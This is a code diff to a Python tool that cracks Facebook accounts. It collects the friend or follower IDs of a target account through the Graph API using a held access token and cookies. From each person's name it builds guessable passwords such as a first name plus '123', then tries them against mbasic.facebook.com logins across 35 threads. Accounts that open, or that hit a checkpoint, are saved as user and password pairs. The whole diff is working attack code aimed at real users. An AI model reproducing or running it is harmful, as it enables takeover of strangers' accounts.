@@ -139,7 +139,7 @@ class Main:
                 self.dumpAccount(url=f"https://graph.facebook.com/{account_target}?fields=friends.fields(name,id)&access_token={self.token}", chose="friends")
             else:
                 self.dumpAccount(url=f"https://graph.facebook.com/{account_target}?fields=subscribers.limit(5000)&access_token={self.token}", chose="followers")
-            self.validate
+            self.validate()
         elif chose == '0':
             os.remove('data/token')
             os.remove('data/coki')
@@ -159,6 +159,95 @@ class Main:
                     print(f' > {x}')
             except:
                 print(' > Results 0 ')
+
+    def dumpAccount(self, url, chose):
+        try:
+            r = requests.get(url, cookies=self.coki).json()
+            if chose == "friends":
+                data = r['friends']['data']
+            else:
+                data = r['subscribers']['data']
+            self.data_id = [f"{x['name']}><{x['id']}" for x in data]
+            print(f"TOTAL ID : {len(self.data_id)}")
+            self.validate()
+        except KeyError:
+            print(f"{M}Error: No {chose} data found for the target.{N}")
+        except Exception as e:
+            print(f"{M}Error fetching {chose} data: {e}{N}")
+
+    def validate(self):
+        print("\n >< Crack Running, (CTRL + C) to stop ><\n")
+        with ThreadPoolExecutor(max_workers=35) as executor:
+            for x in self.data_id:
+                name, id = x.split('><')
+                password_list = self.generate_password_list(name)
+                executor.submit(self.crack_account, id, password_list)
+
+    def generate_password_list(self, name):
+        name_parts = name.split(" ")
+        base_passwords = [
+            name,
+            name_parts[0] + '123',
+            name_parts[0] + '1234',
+            name_parts[0] + '12345',
+            name_parts[0] + '@123',
+            name_parts[0] + '@1234',
+            name_parts[0] + '@12345',
+            name_parts[0] + '123456',
+            name_parts[0] + '@12',
+            name_parts[0] + 'don123',
+            name_parts[0] + '999',
+            '12345678@'
+        ]
+        return base_passwords
+
+    def crack_account(self, user, password_list):
+        session = requests.Session()
+        for pw in password_list:
+            try:
+                r = session.get(
+                    f"{self.mbasic}/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr",
+                    headers={
+                        'Host': 'mbasic.facebook.com',
+                        'User-Agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
+                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+                        'Referer': 'https://mbasic.facebook.com/login/device-based/',
+                        'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
+                    }
+                )
+                soup = BeautifulSoup(r.text, 'html.parser')
+                form = soup.find('form', {'method': 'post'})
+                data = {x.get('name'): x.get('value') for x in form.find_all('input', {'type': ['hidden', 'submit']})}
+                data.update({
+                    'uid': user,
+                    'next': 'https://mbasic.facebook.com/login/save-device/',
+                    'flow': 'login_no_pin',
+                    'encpass': f'#PWD_BROWSER:0:{real_time()}:{pw}'
+                })
+                response = session.post(
+                    f"{self.mbasic}/login/device-based/validate-password/",
+                    data=data,
+                    headers={
+                        'Host': 'mbasic.facebook.com',
+                        'Origin': 'https://mbasic.facebook.com',
+                        'Referer': f'https://mbasic.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr',
+                        'User-Agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'
+                    }
+                )
+                if "c_user" in session.cookies.get_dict():
+                    print(f'\r{H}[SUCCESS] {user} • {pw} •{N}')
+                    ok.append(f"{user}|{pw}")
+                    with open("data/ok", "a") as f:
+                        f.write(f"{user}|{pw}\n")
+                    break
+                elif "checkpoint" in session.cookies.get_dict():
+                    print(f'\r{M}[CHECKPOINT] {user} • {pw} •{N}')
+                    cp.append(f"{user}|{pw}")
+                    with open("data/cp", "a") as f:
+                        f.write(f"{user}|{pw}\n")
+                    break
+            except Exception as e:
+                print(f"{M}Error cracking account {user}: {e}{N}")
 
 # Login function
 def _login():
